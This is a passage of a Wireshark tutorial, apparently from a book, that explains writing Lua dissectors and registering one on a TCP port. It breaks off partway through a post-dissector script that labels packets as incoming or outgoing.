<div class="Section360" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Experiment</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Of course, the best way to learn is to experiment. You should load this script into Wireshark with the corresponding packet capture (or make your own capture) and play around with removing some lines and explore making changes to this dissector.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that you can add an item with or without a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. When</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you add an item without a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, it means you don&#8217;t have the ability to filter on that particular field. When you add an item using a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, Wireshark displays the bytes based on how you defined the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Wireshark obviously <a name="_bookmark658" ></a>doesn&#8217;t know how to display the bytes when you aren&#8217;t using a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, so you can convert the bytes manually by calling methods on the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tvb (buf) </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object, such as in the following</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >code:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(buf(0, 2), "Length: " .. buf(0, 2):uint()):append_text</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >("\t[*] add without ProtoField -- uint")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Also, notice that we use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >append_text() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >method to add additional text everywhere but our delimiter field. The reason is that </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >append_text() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is handy for adding additional text to the field without running into the issues with concatenating differing types (like a string and a uint), which Lua will complain about. You will see that the dissector also makes use of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >add_le() method</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which adds the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, but displays the bytes in little endian order.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One interesting gotcha that was discovered while writing this script is how Unicode is handled in dissectors. First, create your field as a string by using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField.string()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >such as:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_addata = ProtoField.string("sample.addata",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"AddData", "This is</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Additional Data")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To get it to display properly, however, you must use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tvb:ustring() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >method to coerce the string to proper Unicode, such as in the following code:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_addata, buf(11, -1), buf(11, -1):ustring())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section361" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It may look odd that the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tvb (buf) </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is taking in a size of -1. This is a convenience, as it is saying that we want to display the remaining number of packets, which is particularly handy when you have a protocol like ours where the last field can be variable length, and you want to make sure your dissector picks up all the bytes regardless of the size. The final piece of code deals with how the dissector is actually registered:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:101.5000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--load the tcp.port tables</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:101.5000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp_table = DissectorTable.get("tcp.port")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:93.5000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--register our protocol to handle tcp port 9999 tcp_table:add(9999,sample_proto)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, we grab the TCP Dissector Table and add our new sample protocol dissector to that table. Then, we specify that Wireshark should attempt to use the sample protocol dissector for traffic going over TCP port 9999. And there you have it: the final protocol that should show you how to create custom fields, how to display and parse that data, as well as add varying levels to your Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Again, remember that we did not go over this script line by line, because the best way to get a handle on how dissectors work is not to listen to someone try to explain them but to instead go in and mess around to see what the results are in the GUI. Experiment with the script and see how the output changes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;line-height:17.3000pt;mso-line-height-rule:exactly;" ><a name="_bookmark659" ></a><span><a href="http://wiki.wireshark.org/LuaAPI" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remember, you can reference the Wireshark Lua API at </span><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://wiki</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:17.3000pt;mso-line-height-rule:exactly;" ><span><a href="http://wiki.wireshark.org/LuaAPI" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >.wireshark.org/LuaAPI</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Extending Wireshark" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark660" ></a>Extending Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Besides outputting information on the command line, as in the previous section, Lua plug-ins are also able to add graphical features to Wireshark&#8212;from columns in the packet list to full-fledged GUI windows and dialog boxes. In this case, we keep it simple by adding a column to the packet list. The column shows the direction of a packet based on the configured IP address&#8212;that is, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >from </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >your host or </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >to </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >your host. Now that you have some experience with Wireshark API and Lua scripting, we are going to just jump right into the source.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section362" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Packet Direction Script</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This script is actually a post-dissector; it is called after the dissectors are done analyzing the packet. It registers a dissector called &#8220;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Direction</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8221; with one field also called &#8220;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >direction</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8221;. These values are appended to the tree that is visible in the Packet Details pane. This tree contains all the dissectors that are relevant for a packet with the corresponding fields.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.4000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >packet-direction.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- IP address of our sniffing machine, change this to your IP address</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >hostip = "192.168.1.25"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- define the function which determines incoming or outgoing local function getdestination(src,dst)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:229.0000pt;margin-left:51.1500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if tostring(src) == hostip then return "outgoing"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:229.0000pt;margin-left:51.1500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if tostring(dst) == hostip then return "incoming"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.8000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function register_ipdirection_postdissector()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:51.3500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create the protocol dissector called direction local proto = Proto('direction', 'direction</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dissector')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create a protofield</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local direction = ProtoField.string('direction.direction', 'direction', 'direction')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- assign the protofield to our protocol dissector proto.fields = {direction}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- <a name="_bookmark661" ></a>create variables for the packet fields we are interested</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >in</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >getting access to</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local source = Field.new('ip.src') local dest = Field.new('ip.dst')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  